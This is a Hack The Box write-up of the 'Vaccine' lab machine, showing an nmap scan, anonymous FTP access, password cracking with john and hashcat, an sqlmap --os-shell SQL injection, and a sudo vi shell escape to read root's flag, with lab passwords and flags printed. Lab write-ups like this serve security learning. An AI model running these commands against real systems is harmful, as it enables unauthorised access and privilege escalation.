@@ -1,0 +1,320 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+    <link rel="icon" href="/favicon.ico" type="image/x-icon">
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Hack The Box Vaccine | frncscrlnd’s writeups</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="Hack The Box Vaccine" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Walkthorugh/Writeup for Vaccine, a boot to root Starting Point Hack The Box machine featuring SQL injections and privilege escalation." />
+<meta property="og:description" content="Walkthorugh/Writeup for Vaccine, a boot to root Starting Point Hack The Box machine featuring SQL injections and privilege escalation." />
+<link rel="canonical" href="http://localhost:4000/hackthebox/Vaccine" />
+<meta property="og:url" content="http://localhost:4000/hackthebox/Vaccine" />
+<meta property="og:site_name" content="frncscrlnd’s writeups" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Hack The Box Vaccine" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Walkthorugh/Writeup for Vaccine, a boot to root Starting Point Hack The Box machine featuring SQL injections and privilege escalation.","headline":"Hack The Box Vaccine","url":"http://localhost:4000/hackthebox/Vaccine"}</script>
+<!-- End Jekyll SEO tag -->
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=150d28b77225a4a207f11ff76d8d5a1e96152911">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <!--[if lt IE 9]>
+      <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+    <![endif]-->
+    <!--[if lt IE 8]>
+    <link rel="stylesheet" href="/assets/css/ie.css">
+    <![endif]-->
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup theme-color -->
+<!-- start theme color meta headers -->
+<meta name="theme-color" content="#353535">
+<meta name="msapplication-navbutton-color" content="#353535">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- end theme color meta headers -->
+
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+    <script>
+      MathJax = {
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']],
+          displayMath: [['$$', '$$'], ['\\[', '\\]']]
+        },
+        svg: { fontCache: 'global' }
+      };
+    </script>
+    <script id="MathJax-script" async
+            src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js">
+    </script>
+  </head>
+  <body>
+    <div class="wrapper">
+      <section>
+        <div id="title">
+          <h1>frncscrlnd's writeups</h1>
+          <p>Writeups from challenges and CTFs i take part in.</p>
+          <hr>
+          <span class="credits left">Project maintained by <a href="https://github.com/frncscrlnd">frncscrlnd</a></span>
+          <span class="credits right">Hosted on GitHub Pages &mdash; Theme by <a href="https://twitter.com/mattgraham">mattgraham</a></span>
+        </div>
+
+        <h1 id="vaccine"><a href="https://app.hackthebox.com/machines/Vaccine">Vaccine</a><!-- omit in toc --></h1>
+
+<p>This Starting Point machine revolves around <a href="https://en.wikipedia.org/wiki/SQL_injection">SQL injections</a> and privilege escalation.</p>
+
+<h3 id="table-of-contents">Table of contents:</h3>
+<ul>
+  <li><a href="#task-1">Task 1</a></li>
+  <li><a href="#task-2">Task 2</a></li>
+  <li><a href="#task-3">Task 3</a></li>
+  <li><a href="#task-4">Task 4</a></li>
+  <li><a href="#task-5">Task 5</a></li>
+  <li><a href="#task-6">Task 6</a></li>
+  <li><a href="#task-7">Task 7</a></li>
+  <li><a href="#submit-user-flag">Submit User Flag</a></li>
+  <li><a href="#submit-root-flag">Submit Root Flag</a></li>
+</ul>
+
+<h2 id="task-1">Task 1</h2>
+
+<p><em>Besides SSH and HTTP, what other service is hosted on this box?</em></p>
+
+<p>This task asks us to carry out a network services scan. Let’s see if a basic <a href="https://nmap.org/">nmap</a> scan will work:</p>
+
+<p><code class="language-plaintext highlighter-rouge">nmap target-ip-here</code></p>
+
+<p>This will return</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+80/tcp open  http
+</code></pre></div></div>
+
+<p>This basic scan was just enough to tell us that besides the <a href="https://en.wikipedia.org/wiki/HTTP">HTTP</a> and <a href="https://en.wikipedia.org/wiki/Secure_Shell">SSH</a> services, an</p>
+
+<blockquote>
+  <p>FTP</p>
+</blockquote>
+
+<p>service is hosted on the box.</p>
+
+<h2 id="task-2">Task 2</h2>
+
+<p><em>This service can be configured to allow login with any password for specific username. What is that username?</em></p>
+
+<p>As we’ve seen in the <a href="https://frncscrlnd.github.io/writeups/hackthebox/Crocodile">Crocodile</a> box, <code class="language-plaintext highlighter-rouge">anonymous</code> is the username that can be set up to allow login with any password.</p>
+
+<p>We can try logging in this way with <code class="language-plaintext highlighter-rouge">ftp anonymous@target-ip.here</code></p>
+
+<p>This will return</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>230 Login successful.
+</code></pre></div></div>
+
+<p>Which means we’ve correctly logged in. This also means that</p>
+
+<blockquote>
+  <p>anonymous</p>
+</blockquote>
+
+<p>is the username that can be set up to allow login with any password.</p>
+
+<h2 id="task-3">Task 3</h2>
+
+<p><em>What is the name of the file downloaded over this service?</em></p>
+
+<p>We can list files via FTP with <code class="language-plaintext highlighter-rouge">ls</code>.</p>
+
+<p>This will return:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>229 Entering Extended Passive Mode (|||10329|)
+150 Here comes the directory listing.
+-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
+226 Directory send OK.
+</code></pre></div></div>
+
+<p>This means that the file we are looking for is</p>
+
+<blockquote>
+  <p>backup.zip</p>
+</blockquote>
+
+<h2 id="task-4">Task 4</h2>
+
+<p><em>What script comes with the John The Ripper toolset and generates a hash from a password protected zip archive in a format to allow for cracking attempts?</em></p>
+
+<p>The task is talking about a script which is included in <a href="https://www.openwall.com/john/">John The Ripper</a>, a password bruteforce/guessing toolkit we learned about in the <a href="https://frncscrlnd.github.io/writeups/hackthebox/Responder">Responder</a> box. <code class="language-plaintext highlighter-rouge">john</code> includes multiple script that can extract <a href="https://en.wikipedia.org/wiki/Hash_function">hashes/digests</a> from some common file formats (<code class="language-plaintext highlighter-rouge">.zip</code>, <code class="language-plaintext highlighter-rouge">.rar</code>, <code class="language-plaintext highlighter-rouge">.pdf</code>, <code class="language-plaintext highlighter-rouge">.pptx</code>, <code class="language-plaintext highlighter-rouge">.docx</code>, <code class="language-plaintext highlighter-rouge">.kdbx</code> and more). The scripts are <code class="language-plaintext highlighter-rouge">zip2john</code>, <code class="language-plaintext highlighter-rouge">pdf2john</code>, <code class="language-plaintext highlighter-rouge">rar2john</code>, <code class="language-plaintext highlighter-rouge">office2john</code>, <code class="language-plaintext highlighter-rouge">ssh2john</code> and <code class="language-plaintext highlighter-rouge">keepass2john</code>. To get a hash from this file we need to use</p>
+
+<blockquote>
+  <p>zip2john</p>
+</blockquote>
+
+<p>To get the password to the <code class="language-plaintext highlighter-rouge">.zip</code> file we first need to extract the hash with <code class="language-plaintext highlighter-rouge">zip2john backup.zip &gt; hash.txt</code></p>
+
+<p>Then we need to crack the hash using <code class="language-plaintext highlighter-rouge">john</code>. We can try the standard wordlist (<code class="language-plaintext highlighter-rouge">/usr/share/john/password.lst
+</code>) by using <code class="language-plaintext highlighter-rouge">john hash.txt</code></p>
+
+<p>This will return</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>741852963        (backup.zip) 
+</code></pre></div></div>
+
+<p>This means that the password will be <code class="language-plaintext highlighter-rouge">741852963</code>. If you unzip the <code class="language-plaintext highlighter-rouge">backup.zip</code> file with <code class="language-plaintext highlighter-rouge">unzip backup.zip</code>, you’ll be prompted to type a password, like this:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[backup.zip] index.php password: 
+</code></pre></div></div>
+
+<p>After typing the password,use <code class="language-plaintext highlighter-rouge">ls</code> to show the revealed files. This will return:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>backup.zip  hash.txt  index.php  style.css
+</code></pre></div></div>
+
+<h2 id="task-5">Task 5</h2>
+
+<p><em>What is the password for the admin user on the website?</em></p>
+
+<p>Use <code class="language-plaintext highlighter-rouge">cat index.php</code> to read the content of the webpage. This will reveal that this is a login page. The authentication logic is vulnerable:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  if(isset($_POST['username']) &amp;&amp; isset($_POST['password'])) {
+    if($_POST['username'] === 'admin' &amp;&amp; md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
+      $_SESSION['login'] = "true";
+      header("Location: dashboard.php");
+    }
+  }
+</code></pre></div></div>
+
+<p>This means that the password hash (<code class="language-plaintext highlighter-rouge">2cb42f8734ea607eefed3b70af13bbd3</code>) and function (md5) is stored in the code. We can now use <a href="https://hashcat.net/hashcat/"><code class="language-plaintext highlighter-rouge">hashcat</code></a>, a dictionary attack utility similar to john, to crack it. However, in order to do so, we need to put the hash string into a file, like this: <code class="language-plaintext highlighter-rouge">echo 2cb42f8734ea607eefed3b70af13bbd3 &gt; md5.txt</code>. Then we need to use hashcat’s <a href="https://hashcat.net/wiki/doku.php?id=example_hashes">example hashes</a> to knwo which code md5 refers to. Since we know hashcat’s md5 code is 0, we can crack the hash by using the <code class="language-plaintext highlighter-rouge">rockyou.txt</code> wordlist like this:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat -m 0 md5.txt /usr/share/wordlists/rockyou.txt 
+</code></pre></div></div>
+
+<p>This will return:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>2cb42f8734ea607eefed3b70af13bbd3:qwerty789                
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+</code></pre></div></div>
+
+<p>This measn the the admin’s password is</p>
+
+<blockquote>
+  <p>qwerty789</p>
+</blockquote>
+
+<h2 id="task-6">Task 6</h2>
+
+<p><em>What option can be passed to sqlmap to try to get command execution via the sql injection?</em></p>
+
+<p>A <a href="https://en.wikipedia.org/wiki/SQL_injection">SQL injection (SQLi)</a> is a code injection vulnerability that allows dangerous valid <a href="https://en.wikipedia.org/wiki/SQL">SQL</a> syntax to be injected in a request. We’ll explore how to exploit one with <a href="https://en.wikipedia.org/wiki/Sqlmap">SQLmap</a>.</p>
+
+<p>By visiting the target IP from a browser we’ll be met with the login page we’va seen before. Login with <code class="language-plaintext highlighter-rouge">admin</code> and <code class="language-plaintext highlighter-rouge">qwerty789</code>. You’ll now see a car catalogue like this:</p>
+
+<p><img src="/assets/images/htb/vaccine/catalogue.png" alt="catalogue" /></p>
+
+<p>Open up <a href="https://portswigger.net/burp">Burp</a>, <a href="https://portswigger.net/burp/documentation/desktop/getting-started">set it up</a> if you haven’t and turn your <a href="https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/">FoxyProxy</a> extension to use Burp as a proxy and ‘Intercept on’.  Type something inside the search bar and press enter. You’ll capture the request to that page, something like this:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /dashboard.php?search=abc HTTP/1.1
+Host: 10.129.95.174
+User-Agent: ...
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Referer: http://10.129.95.174/dashboard.php
+Cookie: PHPSESSID=...
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+</code></pre></div></div>
+
+<p>copy it and paste it into a file after creating one with <code class="language-plaintext highlighter-rouge">nano request.txt</code>. After pasting the request, we can look online at the <a href="https://github.com/sqlmapproject/sqlmap/wiki/usage">official wiki</a> or use sqlmap –help for which option can be used to get command execution. We now know that</p>
+
+<blockquote>
+  <p>–os-shell</p>
+</blockquote>
+
+<p>is the option we are looking for.</p>
+
+<h2 id="task-7">Task 7</h2>
+
+<p><em>What program can the postgres user run as root using sudo?</em></p>
+
+<p>After running <code class="language-plaintext highlighter-rouge">sqlmap -r request.txt --os-shell</code> we now know that <code class="language-plaintext highlighter-rouge">the back-end DBMS is PostgreSQL</code>, as sqlmap tells us. We also get a shell, as you can see by the <code class="language-plaintext highlighter-rouge">os-shell&gt;</code> prompt. After looking around for a bit, you’ll find that in <code class="language-plaintext highlighter-rouge">/var/www/html/dashboard.php</code> (the web server’s main directory) there is a user and password. We can use these to log in as <code class="language-plaintext highlighter-rouge">postgres</code> user via SSH:</p>
+
+<p><code class="language-plaintext highlighter-rouge">ssh postgres@target-ip-here</code></p>
+
+<p>And then, when prompted with a password:</p>
+
+<p><code class="language-plaintext highlighter-rouge">P@s5w0rd!</code></p>
+
+<p>This will return</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>postgres@vaccine:~$ 
+</code></pre></div></div>
+
+<p>Which means that we are logged in. Run <code class="language-plaintext highlighter-rouge">sudo -l</code> and the the user’s password to see which programs can be run from this user by using <code class="language-plaintext highlighter-rouge">sudo</code>. This will return</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>User postgres may run the following commands on vaccine:
+    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
+</code></pre></div></div>
+
+<p>which means that the program we are looking for is</p>
+
+<blockquote>
+  <p>vi</p>
+</blockquote>
+
+<p>, a common <a href="https://ex-vi.sourceforge.net/">text editor</a>.</p>
+
+<h2 id="submit-user-flag">Submit User Flag</h2>
+
+<p><em>Submit the flag located in the postgres user’s home directory.</em></p>
+
+<p>After using <code class="language-plaintext highlighter-rouge">ls</code> we can see that there’s a <code class="language-plaintext highlighter-rouge">user.txt</code> file, which is also the postgres user’s flag:</p>
+
+<blockquote>
+  <p>ec9b13ca4d6229cd5cc1e09980965bf7</p>
+</blockquote>
+
+<h2 id="submit-root-flag">Submit Root Flag</h2>
+
+<p><em>Submit the flag located in root’s home directory.</em></p>
+
+<p>The root flag is inside the /root directory, but we can’t access it. Since we can use the <code class="language-plaintext highlighter-rouge">sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf</code> command, let’s try and acces the directory from inside vi: once the text editor is open, use the <code class="language-plaintext highlighter-rouge">:!</code> to <a href="https://ex-vi.sourceforge.net/ex.html#:~:text=%21%20command,-The">shell escape</a> and run commands as root. <code class="language-plaintext highlighter-rouge">:!whoami</code>, in fact, will return <code class="language-plaintext highlighter-rouge">root</code>.</p>
+
+<p>Run <code class="language-plaintext highlighter-rouge">:!ls /root</code> and it will return:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pg_hba.conf  root.txt  snap
+</code></pre></div></div>
+
+<p>Now run <code class="language-plaintext highlighter-rouge">:!cat /root/root.txt</code> and it will return the flag:</p>
+
+<blockquote>
+  <p>dd6e058e814260bc70e9bbdef2715849</p>
+</blockquote>
+
+
+      </section>
+
+    </div>
+  </body>
+</html>
